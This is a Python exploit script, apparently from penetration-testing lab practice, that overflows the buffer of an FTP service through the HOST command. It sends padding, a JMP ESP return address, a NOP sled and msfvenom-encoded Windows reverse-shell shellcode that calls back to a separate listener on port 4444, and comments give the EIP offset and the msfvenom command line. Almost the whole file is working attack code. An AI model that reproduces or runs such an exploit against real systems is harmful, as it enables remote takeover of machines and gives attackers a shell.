#!/usr/bin/python
import socket 
import time 
import os 

# 41326941 EIP OVERWRITE	
# 'C' * 491  
# 77FAB277 JMP ESP 
# evil = 'A' * 741 
# 741 total length
## msfvenom --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.253.82 LPORT=4444 -e X86/shikata_ga_nai -b "\x00\x0a\x0d" -f c

shellcode = ("\xdb\xca\xd9\x74\x24\xf4\xbe\x3b\xba\x27\xd3\x5f\x31\xc9\xb1"
"\x52\x31\x77\x17\x83\xc7\x04\x03\x4c\xa9\xc5\x26\x4e\x25\x8b"
"\xc9\xae\xb6\xec\x40\x4b\x87\x2c\x36\x18\xb8\x9c\x3c\x4c\x35"
"\x56\x10\x64\xce\x1a\xbd\x8b\x67\x90\x9b\xa2\x78\x89\xd8\xa5"
"\xfa\xd0\x0c\x05\xc2\x1a\x41\x44\x03\x46\xa8\x14\xdc\x0c\x1f"
"\x88\x69\x58\x9c\x23\x21\x4c\xa4\xd0\xf2\x6f\x85\x47\x88\x29"
"\x05\x66\x5d\x42\x0c\x70\x82\x6f\xc6\x0b\x70\x1b\xd9\xdd\x48"
"\xe4\x76\x20\x65\x17\x86\x65\x42\xc8\xfd\x9f\xb0\x75\x06\x64"
"\xca\xa1\x83\x7e\x6c\x21\x33\x5a\x8c\xe6\xa2\x29\x82\x43\xa0"
"\x75\x87\x52\x65\x0e\xb3\xdf\x88\xc0\x35\x9b\xae\xc4\x1e\x7f"
"\xce\x5d\xfb\x2e\xef\xbd\xa4\x8f\x55\xb6\x49\xdb\xe7\x95\x05"
"\x28\xca\x25\xd6\x26\x5d\x56\xe4\xe9\xf5\xf0\x44\x61\xd0\x07"
"\xaa\x58\xa4\x97\x55\x63\xd5\xbe\x91\x37\x85\xa8\x30\x38\x4e"
"\x28\xbc\xed\xc1\x78\x12\x5e\xa2\x28\xd2\x0e\x4a\x22\xdd\x71"
"\x6a\x4d\x37\x1a\x01\xb4\xd0\xe5\x7e\x4b\x48\x8e\x7c\xb3\x88"
"\xf5\x08\x55\xe0\x19\x5d\xce\x9d\x80\xc4\x84\x3c\x4c\xd3\xe1"
"\x7f\xc6\xd0\x16\x31\x2f\x9c\x04\xa6\xdf\xeb\x76\x61\xdf\xc1"
"\x1e\xed\x72\x8e\xde\x78\x6f\x19\x89\x2d\x41\x50\x5f\xc0\xf8"
"\xca\x7d\x19\x9c\x35\xc5\xc6\x5d\xbb\xc4\x8b\xda\x9f\xd6\x55"
"\xe2\x9b\x82\x09\xb5\x75\x7c\xec\x6f\x34\xd6\xa6\xdc\x9e\xbe"
"\x3f\x2f\x21\xb8\x3f\x7a\xd7\x24\xf1\xd3\xae\x5b\x3e\xb4\x26"
"\x24\x22\x24\xc8\xff\xe6\x54\x83\x5d\x4e\xfd\x4a\x34\xd2\x60"
"\x6d\xe3\x11\x9d\xee\x01\xea\x5a\xee\x60\xef\x27\xa8\x99\x9d"
"\x38\x5d\x9d\x32\x38\x74") # 351 bytes 

evil = "A" * 246 + "\x5C\x56\xDB\x77" + 99 * "\x90" + shellcode + 100 * "C"

print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.1.21', 21))

s.recv(1024)

s.send('HOST ' + evil + '\r\n')

s.recv(1024)

s.close()

